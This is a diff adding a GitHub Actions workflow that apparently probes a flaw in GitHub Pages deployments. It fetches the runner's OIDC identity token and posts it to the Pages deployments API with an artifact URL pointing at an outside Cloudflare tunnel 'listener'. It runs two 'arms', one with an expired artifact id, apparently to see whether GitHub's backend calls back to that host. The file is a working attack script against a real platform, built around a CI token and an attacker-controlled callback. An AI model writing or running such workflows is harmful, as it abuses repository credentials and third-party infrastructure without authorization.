@@ -1,0 +1,44 @@
+name: vfy-bf45db64
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+    steps:
+      - name: arms
+        env:
+          GH_TOKEN: ${{ github.token }}
+          LISTENER: https://shoppers-jet-nhs-ranking.trycloudflare.com
+          EXPIRED_ID: "9690936155"
+        run: |
+          set -u
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          echo "oidc token length: ${#TOKEN}"
+          BASE="$LISTENER/_apis/pipelines/1/runs/1/artifacts"
+          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
+
+          echo "===== ARM A : artifact_url ONLY (control, expect 400) ====="
+          jq -nc --arg u "$BASE?arm=A_URLONLY" --arg s "$GITHUB_SHA" --arg t "$TOKEN" \
+            '{artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > a.json
+          curl -s -o aout.json -w "ARM_A_HTTP=%{http_code}\n" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "$API" -d @a.json
+          echo "ARM A body:"; cat aout.json; echo
+
+          echo "waiting 25s so any ARM A callback would land BEFORE arm B"
+          sleep 25
+
+          echo "===== ARM B : EXPIRED artifact_id + SAME host/path (expect 200) ====="
+          jq -nc --arg u "$BASE?arm=B_EXPIRED" --arg s "$GITHUB_SHA" --arg t "$TOKEN" --argjson id "$EXPIRED_ID" \
+            '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > b.json
+          curl -s -o bout.json -w "ARM_B_HTTP=%{http_code}\n" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "$API" -d @b.json
+          echo "ARM B body:"; cat bout.json; echo
+          echo "done"
